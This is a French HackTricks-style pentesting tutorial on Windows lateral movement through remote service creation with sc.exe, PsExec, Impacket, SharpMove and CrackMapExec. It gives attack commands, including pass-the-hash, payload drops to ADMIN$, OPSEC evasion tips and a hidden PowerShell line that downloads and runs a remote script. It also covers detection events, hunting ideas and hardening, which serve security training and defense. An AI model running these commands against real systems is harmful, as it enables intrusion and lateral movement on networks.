# PsExec/Winexec/ScExec/SMBExec

{{#include ../../banners/hacktricks-training.md}}

## Comment ça fonctionne

Ces techniques abusent du Gestionnaire de Contrôle de Service Windows (SCM) à distance via SMB/RPC pour exécuter des commandes sur un hôte cible. Le flux commun est :

1. S'authentifier auprès de la cible et accéder au partage ADMIN$ via SMB (TCP/445).
2. Copier un exécutable ou spécifier une ligne de commande LOLBAS que le service exécutera.
3. Créer un service à distance via SCM (MS-SCMR sur \PIPE\svcctl) pointant vers cette commande ou binaire.
4. Démarrer le service pour exécuter le payload et éventuellement capturer stdin/stdout via un pipe nommé.
5. Arrêter le service et nettoyer (supprimer le service et tout binaire déposé).

Exigences/prérequis :
- Administrateur local sur la cible (SeCreateServicePrivilege) ou droits explicites de création de service sur la cible.
- SMB (445) accessible et partage ADMIN$ disponible ; Gestion de Service à Distance autorisée à travers le pare-feu de l'hôte.
- Restrictions UAC à distance : avec des comptes locaux, le filtrage de jetons peut bloquer l'administrateur sur le réseau à moins d'utiliser l'Administrateur intégré ou LocalAccountTokenFilterPolicy=1.
- Kerberos vs NTLM : utiliser un nom d'hôte/FQDN active Kerberos ; se connecter par IP revient souvent à NTLM (et peut être bloqué dans des environnements renforcés).

### ScExec/WinExec manuel via sc.exe

Ce qui suit montre une approche minimale de création de service. L'image du service peut être un EXE déposé ou un LOLBAS comme cmd.exe ou powershell.exe.
```cmd
:: Execute a one-liner without dropping a binary
sc.exe \\TARGET create HTSvc binPath= "cmd.exe /c whoami > C:\\Windows\\Temp\\o.txt" start= demand
sc.exe \\TARGET start HTSvc
sc.exe \\TARGET delete HTSvc

:: Drop a payload to ADMIN$ and execute it (example path)
copy payload.exe \\TARGET\ADMIN$\Temp\payload.exe
sc.exe \\TARGET create HTSvc binPath= "C:\\Windows\\Temp\\payload.exe" start= demand
sc.exe \\TARGET start HTSvc
sc.exe \\TARGET delete HTSvc
```
Notes :
- Attendez-vous à une erreur de délai d'attente lors du démarrage d'un EXE non-service ; l'exécution se produit néanmoins.
- Pour rester plus amical avec l'OPSEC, préférez les commandes sans fichier (cmd /c, powershell -enc) ou supprimez les artefacts déposés.

Trouvez des étapes plus détaillées dans : https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/

## Outils et exemples

### Sysinternals PsExec.exe

- Outil d'administration classique qui utilise SMB pour déposer PSEXESVC.exe dans ADMIN$, installe un service temporaire (nom par défaut PSEXESVC) et proxy I/O via des pipes nommés.
- Exemples d'utilisation :
```cmd
:: Interactive SYSTEM shell on remote host
PsExec64.exe -accepteula \\HOST -s -i cmd.exe

:: Run a command as a specific domain user
PsExec64.exe -accepteula \\HOST -u DOMAIN\user -p 'Passw0rd!' cmd.exe /c whoami /all

:: Customize the service name for OPSEC (-r)
PsExec64.exe -accepteula \\HOST -r WinSvc$ -s cmd.exe /c ipconfig
```
- Vous pouvez lancer directement depuis Sysinternals Live via WebDAV :
```cmd
\\live.sysinternals.com\tools\PsExec64.exe -accepteula \\HOST -s cmd.exe /c whoami
```
OPSEC
- Laisse des événements d'installation/désinstallation de service (le nom du service est souvent PSEXESVC sauf si -r est utilisé) et crée C:\Windows\PSEXESVC.exe pendant l'exécution.

### Impacket psexec.py (similaire à PsExec)

- Utilise un service intégré similaire à RemCom. Dépose un binaire de service transitoire (nom souvent aléatoire) via ADMIN$, crée un service (par défaut souvent RemComSvc), et proxy I/O via un pipe nommé.
```bash
# Password auth
psexec.py DOMAIN/user:Password@HOST cmd.exe

# Pass-the-Hash
psexec.py -hashes LMHASH:NTHASH DOMAIN/user@HOST cmd.exe

# Kerberos (use tickets in KRB5CCNAME)
psexec.py -k -no-pass -dc-ip 10.0.0.10 DOMAIN/user@host.domain.local cmd.exe

# Change service name and output encoding
psexec.py -service-name HTSvc -codec utf-8 DOMAIN/user:Password@HOST powershell -nop -w hidden -c "iwr http://10.10.10.1/a.ps1|iex"
```
Artifacts
- EXE temporaire dans C:\Windows\ (8 caractères aléatoires). Le nom du service par défaut est RemComSvc, sauf s'il est remplacé.

### Impacket smbexec.py (SMBExec)

- Crée un service temporaire qui lance cmd.exe et utilise un pipe nommé pour l'entrée/sortie. Évite généralement de déposer un payload EXE complet ; l'exécution de commandes est semi-interactive.
```bash
smbexec.py DOMAIN/user:Password@HOST
smbexec.py -hashes LMHASH:NTHASH DOMAIN/user@HOST
```
### SharpLateral et SharpMove

- [SharpLateral](https://github.com/mertdas/SharpLateral) (C#) implémente plusieurs méthodes de mouvement latéral, y compris l'exécution basée sur des services.
```cmd
SharpLateral.exe redexec HOSTNAME C:\\Users\\Administrator\\Desktop\\malware.exe.exe malware.exe ServiceName
```
- [SharpMove](https://github.com/0xthirteen/SharpMove) inclut la modification/création de services pour exécuter une commande à distance.
```cmd
SharpMove.exe action=modsvc computername=remote.host.local command="C:\windows\temp\payload.exe" amsi=true servicename=TestService
SharpMove.exe action=startservice computername=remote.host.local servicename=TestService
```
- Vous pouvez également utiliser CrackMapExec pour exécuter via différents backends (psexec/smbexec/wmiexec) :
```bash
cme smb HOST -u USER -p PASS -x "whoami" --exec-method psexec
cme smb HOST -u USER -H NTHASH -x "ipconfig /all" --exec-method smbexec
```
## OPSEC, détection et artefacts

Artefacts typiques d'hôte/réseau lors de l'utilisation de techniques similaires à PsExec :
- Sécurité 4624 (Type de connexion 3) et 4672 (Privilèges spéciaux) sur la cible pour le compte administrateur utilisé.
- Événements de partage de fichiers de sécurité 5140/5145 et événements détaillés de partage de fichiers montrant l'accès ADMIN$ et la création/écriture de binaires de service (par exemple, PSEXESVC.exe ou un .exe aléatoire de 8 caractères).
- Installation de service de sécurité 7045 sur la cible : noms de service comme PSEXESVC, RemComSvc, ou personnalisé (-r / -service-name).
- Sysmon 1 (Création de processus) pour services.exe ou l'image de service, 3 (Connexion réseau), 11 (Création de fichier) dans C:\Windows\, 17/18 (Tube créé/connecté) pour des tubes tels que \\.\pipe\psexesvc, \\.\pipe\remcom_*, ou équivalents randomisés.
- Artefact de registre pour EULA de Sysinternals : HKCU\Software\Sysinternals\PsExec\EulaAccepted=0x1 sur l'hôte opérateur (si non supprimé).

Idées de chasse
- Alerte sur les installations de service où l'ImagePath inclut cmd.exe /c, powershell.exe, ou des emplacements TEMP.
- Rechercher des créations de processus où ParentImage est C:\Windows\PSEXESVC.exe ou des enfants de services.exe s'exécutant en tant que SYSTEM LOCAL exécutant des shells.
- Marquer les tubes nommés se terminant par -stdin/-stdout/-stderr ou des noms de tubes bien connus de clone PsExec.

## Dépannage des échecs courants
- Accès refusé (5) lors de la création de services : pas vraiment administrateur local, restrictions UAC à distance pour les comptes locaux, ou protection contre la falsification EDR sur le chemin binaire du service.
- Le chemin réseau n'a pas été trouvé (53) ou impossible de se connecter à ADMIN$ : pare-feu bloquant SMB/RPC ou partages administratifs désactivés.
- Kerberos échoue mais NTLM est bloqué : se connecter en utilisant le nom d'hôte/FQDN (pas IP), s'assurer des SPNs appropriés, ou fournir -k/-no-pass avec des tickets lors de l'utilisation d'Impacket.
- Le démarrage du service expire mais le payload a été exécuté : attendu si ce n'est pas un véritable binaire de service ; capturer la sortie dans un fichier ou utiliser smbexec pour I/O en direct.

## Notes de durcissement
- Windows 11 24H2 et Windows Server 2025 nécessitent la signature SMB par défaut pour les connexions sortantes (et Windows 11 entrantes). Cela ne casse pas l'utilisation légitime de PsExec avec des identifiants valides mais empêche l'abus de relais SMB non signé et peut impacter les appareils qui ne supportent pas la signature.
- Le nouveau blocage NTLM du client SMB (Windows 11 24H2/Server 2025) peut empêcher le retour à NTLM lors de la connexion par IP ou à des serveurs non-Kerberos. Dans des environnements durcis, cela cassera PsExec/SMBExec basé sur NTLM ; utilisez Kerberos (nom d'hôte/FQDN) ou configurez des exceptions si nécessaire légitimement.
- Principe du moindre privilège : minimiser l'appartenance à l'administrateur local, préférer Just-in-Time/Just-Enough Admin, appliquer LAPS, et surveiller/alerter sur les installations de service 7045.

## Voir aussi

- Exécution à distance basée sur WMI (souvent plus sans fichier) :

{{#ref}}
./wmiexec.md
{{#endref}}

- Exécution à distance basée sur WinRM :

{{#ref}}
./winrm.md
{{#endref}}



## Références

- PsExec - Sysinternals | Microsoft Learn: https://learn.microsoft.com/sysinternals/downloads/psexec
- Durcissement de la sécurité SMB dans Windows Server 2025 & Windows 11 (signature par défaut, blocage NTLM) : https://techcommunity.microsoft.com/blog/filecab/smb-security-hardening-in-windows-server-2025--windows-11/4226591

{{#include ../../banners/hacktricks-training.md}}
